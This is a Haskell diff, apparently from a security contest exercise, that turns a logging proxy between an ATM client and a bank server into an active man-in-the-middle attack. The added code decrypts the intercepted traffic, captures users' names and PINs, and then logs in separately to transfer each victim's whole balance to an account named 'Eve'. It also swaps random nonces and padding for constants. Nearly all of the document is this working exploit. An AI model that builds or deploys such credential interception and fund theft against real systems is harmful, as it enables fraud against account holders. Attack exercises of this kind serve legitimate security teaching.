@@ -42,7 +42,7 @@ main' _ = getProgName >>= \name -> putStrLn $ "Usage: " ++ name ++ " ATM_PORT BA
 main'' atmPort bankPort = do
     listener <- listenOn atmPort
     --handshakeExploit bankPort
-    forever $ accept listener >>= forkIO . doMitm bankPort
+    forever $ accept listener >>= forkIO . doMitm bankPort True
 
 dumbProxy atm bank logTo logFrom = loop where
     bufferSize = 4096
@@ -195,9 +195,11 @@ serializeAction (Action user pin oNonce nNonce cmd amt reci) = do
     let cmd' = stringToBS . show $ fromEnum cmd
     let amt' = stringToBS $ show amt
     let pad1Size = 1
-    let pad2Size = actionBufferSize - (sum (map B.length [oNonce, nNonce, user, pin, cmd', amt', reci]) + 8)
-    pad1 <- getRandomBytes pad1Size
-    pad2 <- getRandomBytes pad2Size
+    let pad2Size = actionBufferSize - (sum (map B.length [oNonce, nNonce, user, pin, cmd', amt', reci]) + 8 + pad1Size)
+    --pad1 <- getRandomBytes pad1Size
+    --pad2 <- getRandomBytes pad2Size
+    let pad1 = B.replicate pad1Size 0x41
+    let pad2 = B.replicate pad2Size 0x42
     return $ B.intercalate ":" [
         B.intercalate ";" [oNonce, nNonce],
         pad1,
@@ -213,37 +215,91 @@ replaceLogoutWithDeposit aes aesIv action ctxt = if actCmd action == Logout
         return $ cfbEncrypt aes aesIv ptxt'
     else return ctxt
 
+-- semicolons/colons in the nonce will mess things up, use constant A's for now
+--makeNonce = getRandomBytes 16
+makeNonce = return $ B.replicate 15 0x41
+
 nextNonce :: MonadRandom m => Action -> m Action
 nextNonce a@(Action {actNewNonce = oldNonce}) = do
-    newNonce <- getRandomBytes 16
+    newNonce <- makeNonce
     return $ a { actOldNonce = oldNonce, actNewNonce = newNonce }
 
-{-
-frontRunLogin username pin = do
-    putStrLn $ "Intercepted creds " ++ username ++ ":" ++ pin
+frontRunLogin bankPort username pin = do
+    let bufferSize = 4096
+    let pubSizeBits = 3072
+    putStrLn $ "Intercepted creds " ++ show username ++ ":" ++ show pin
     putStrLn "Transferring everything to Eve"
     bank <- connectTo "localhost" bankPort
--}
-    
+    hSetBuffering bank (BlockBuffering (Just bufferSize))
+    let putFlush x = B.hPut bank x >> hFlush bank
+    putFlush "DUMMY"
+    bankPubRaw <- B.hGetSome bank bufferSize
+    let bankPub = maybe (error "Failed to decode bank pubkey") id $ decodeX509Pubkey (L.fromChunks [bankPubRaw])
+    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
+    let pubEncrypt = fmap (either (error . show) id) . encrypt (defaultOAEPParams SHA1) bankPub'
+    rawAES <- getRandomBytes 16
+    let aes = makeAES rawAES
+    mitmAES <- pubEncrypt rawAES
+    putFlush mitmAES
+    expect bank "DUMMY"
+    rawIV <- getRandomBytes 16
+    mitmIV <- pubEncrypt rawIV
+    putFlush mitmIV
+    expect bank "DUMMY"
+    let Just aesIV = makeIV rawIV
+    rawNonce <- makeNonce
+    let mitmNonce = cfbEncrypt aes aesIV rawNonce
+    putFlush mitmNonce
+    expect bank "DUMMY"
+    let enc = cfbEncrypt aes aesIV
+    let dec = cfbDecrypt aes aesIV
+    let sendAction a = do
+        putStr "Sending: " >> print a
+        a' <- serializeAction a
+        --print a'
+        let a'' = enc a'
+        --print a''
+        putFlush a''
+    let getAction = do
+        tmp <- B.hGetSome bank bufferSize
+        --print tmp
+        let tmp' = dec tmp
+        print tmp'
+        let r = deserializeAction tmp'
+        print r
+        return r
+    let updateAction a f = fmap f $ nextNonce a
+    newNonce <- makeNonce
+    let a1 = Action username pin rawNonce newNonce Login 0 ""
+    sendAction a1
+    Just r1 <- getAction
+    a2 <- updateAction r1 $ (\a -> a {actCmd = Balance})
+    sendAction a2
+    Just r2 <- getAction
+    a3 <- updateAction r2 $ (\a -> a {actCmd = Transfer, actRecipient = "Eve", actAmount = actAmount r2})
+    sendAction a3
+    Just r3 <- getAction
+    a4 <- updateAction r3 $ (\a -> a {actCmd = Logout})
+    sendAction a4
+    Just r4 <- getAction
+    return ()
 
-passiveMitm atm bank logTo logFrom aes aesIv = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
+passiveMitm atm bank logTo logFrom aes aesIv intercept = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
     bufferSize = 4096
     wrap log ctxt = do
         let ptxt = cfbDecrypt (aes :: AES128) aesIv ctxt
-        --let split' c = B.split (fromIntegral $ ord c)
-        --print . map (split' ';') . split' ':' $ ptxt
         let action = deserializeAction ptxt
         case deserializeAction ptxt of
             Just action -> do
                 log (stringToBS $ show action)
-                -- TODO: just intercept pins and spawn a seperate connection (less invasive)
                 --replaceLogoutWithDeposit aes aesIv action ctxt
+                intercept action
                 return ctxt
             _ -> do
                 log ptxt
                 return ctxt
 
-doMitm bankPort (atm, host, atmPort) = do
+doMitm bankPort active (atm, host, atmPort) = do
     putStrLn $ "Received a connection from " ++ host ++ ":" ++ show atmPort
     putStrLn $ "Forwarding to localhost:" ++ show (unPort bankPort)
     bank <- connectTo "localhost" bankPort
@@ -251,5 +307,7 @@ doMitm bankPort (atm, host, atmPort) = do
     let logTo = log atmPort (unPort bankPort) :: B.ByteString -> IO B.ByteString
     let logFrom = log (unPort bankPort) atmPort  :: B.ByteString -> IO B.ByteString
     --dumbProxy atm bank logTo logFrom
+    let intercept action = if not active then return () else do
+        frontRunLogin bankPort (actUser action) (actPin action)
     (aes, aesIV) <- mitmHandshake atm bank logTo logFrom
-    passiveMitm atm bank logTo logFrom aes aesIV
+    passiveMitm atm bank logTo logFrom aes aesIV intercept
